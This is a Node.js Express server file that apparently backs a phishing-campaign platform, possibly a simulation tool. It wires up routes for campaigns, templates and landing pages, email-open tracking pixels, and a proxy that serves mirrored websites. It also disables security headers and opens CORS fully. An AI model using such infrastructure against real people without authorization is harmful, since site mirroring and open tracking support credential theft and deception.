require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const config = require('./config');
const http = require('http');
const socketIo = require('socket.io');
const crypto = require('crypto');
const db = require('./database'); // Add database import
const landingPageService = require('./services/landingPageService');
const websiteMirroringService = require('./services/websiteMirroringService');

// Import routes
const campaignRoutes = require('./routes/campaignRoutes');
const authRoutes = require('./routes/authRoutes');
const templateRoutes = require('./routes/templateRoutes');
const landingPageRoutes = require('./routes/landingPageRoutes');
const profileRoutes = require('./routes/profileRoutes');
const userGroupRoutes = require('./routes/userGroupRoutes');
const userRoutes = require('./routes/userRoutes');
const utilityRoutes = require('./routes/utilityRoutes');
const aiScraperRoutes = require('./routes/aiScraperRoutes');
const trackingService = require('./services/trackingService');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"]
  }
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Apply security, CORS, logging, and JSON parsing middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  // Disable HTTPS requirements and strict security policies
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginResourcePolicy: false,
  originAgentCluster: false,
  strictTransportSecurity: false
}));

// Configure CORS to be completely open
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'],
  allowedHeaders: ['*'],
  credentials: true,
  maxAge: 86400 // 24 hours
}));
app.use(morgan('combined'));
app.use(express.json({ limit: '300mb' }));
app.use(express.urlencoded({ extended: true })); // For parsing form data


// Ensure OPTIONS requests return valid JSON to prevent empty response issues
app.options('*', (req, res) => {
  res.status(200).json({});
});

// Use routes
app.use('/api', campaignRoutes);
app.use('/api', authRoutes);
app.use('/api', templateRoutes);
app.use('/api', landingPageRoutes);
app.use('/api', profileRoutes);
app.use('/api', userGroupRoutes);
app.use('/api', userRoutes);
app.use('/api', utilityRoutes);
app.use('/api', aiScraperRoutes);

// Register landing page routes
landingPageService.registerLandingPageRoutes(app);

// Add a new endpoint to fetch the latest 'In Progress' campaign
app.get('/api/latest-campaign', async (req, res) => {
  try {
    const query = `SELECT * FROM campaigns WHERE status = 'In Progress' ORDER BY created_at DESC LIMIT 1`;
    const result = await db.get(query);

    if (result) {
      res.json(result);
    } else {
      res.status(404).json({ message: 'No campaign with status In Progress found.' });
    }
  } catch (error) {
    console.error('Error fetching latest campaign:', error);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// Direct tracking endpoint
app.get('/track', (req, res) => {
  console.log('🔍 Direct tracking pixel requested:', req.query.email);
  // Extract campaign and user info from URL parameters if available
  const pixelId = crypto.randomUUID();
  trackingService.logOpen(pixelId, req, res, io);
});

// Multiple tracking pixel endpoints for better compatibility
app.get('/tracker/:id.png', (req, res) => {
  console.log('🔍 PNG Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/track/:id/pixel.gif', (req, res) => {
  console.log('🔍 GIF Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/t/:id/p.png', (req, res) => {
  console.log('🔍 Alternative tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

// Update schema to include email_client column if not exists
db.run(`
  ALTER TABLE open_logs 
  ADD COLUMN email_client TEXT DEFAULT 'Unknown'
`, (err) => {
  if (err && !err.message.includes('duplicate column')) {
    console.error('Error adding email_client column:', err);
  }
});

// Test tracking pixel endpoint - for testing only
app.get('/test-tracker/:id', (req, res) => {
  const pixelId = req.params.id;
  console.log('📝 Test tracking endpoint called for pixel:', pixelId);
  
  // Redirect to the actual tracking pixel
  res.redirect(`/tracker/${pixelId}.png`);
});

// Website mirroring path-based route handler (must be before other routes)
app.use('/:sessionToken', async (req, res, next) => {
  // Check if this is a valid mirroring session token (32-char hex)
  const sessionToken = req.params.sessionToken;
  
  // Skip static resources and API paths
  if (req.path.startsWith('/api/') || 
      req.path.startsWith('/assets/') ||
      req.path.startsWith('/static/')) {
    return next();
  }
  
  if (sessionToken && /^[0-9a-f]{32}$/i.test(sessionToken)) {
    console.log(`Potential mirroring request detected: ${sessionToken}`);
    
    // Advanced error handling for mirroring
    try {
      return await websiteMirroringService.handleMirrorRequest(sessionToken, req, res);
    } catch (error) {
      console.error(`Error in mirroring handler: ${error.message}`);
      return res.status(500).send(`
        <html>
          <head>
            <title>Proxy Error</title>
            <style>body{font-family:sans-serif;max-width:600px;margin:40px auto;line-height:1.6}</style>
            <meta http-equiv="refresh" content="5;url=/${sessionToken}/">
          </head>
          <body>
            <h2>Error connecting to website</h2>
            <p>There was a problem connecting to the target website. Redirecting to homepage in 5 seconds...</p>
            <p><a href="/${sessionToken}/">Click here if you're not redirected automatically</a></p>
          </body>
        </html>
      `);
    }
  }
  
  next(); // Not a mirroring request, continue to other routes
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('New client connected', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected', socket.id);
  });
});

app.get('/', (req, res) => {
  res.json({ status: 'Backend is running' });
});

// Catch-all for undefined routes - always returns JSON
app.use((req, res) => {
  res.status(404).json({ message: 'Not Found' });
});

// Global error handler for unexpected errors
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  
  // In development, return the error details
  if (process.env.NODE_ENV !== 'production') {
    return res.status(500).json({ 
      message: 'Internal Server Error', 
      error: err.message,
      stack: err.stack 
    });
  }
  
  // In production, hide error details
  res.status(500).json({ message: 'Internal Server Error' });
});

// Start the server
const PORT = config.port;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
  console.log(`Tracking URL: ${config.trackingUrl}/tracker/:id.png`);
});

// Handle server shutdown
process.on('SIGINT', async () => {
  console.log('Shutting down server...');
  
  process.exit(0);
});
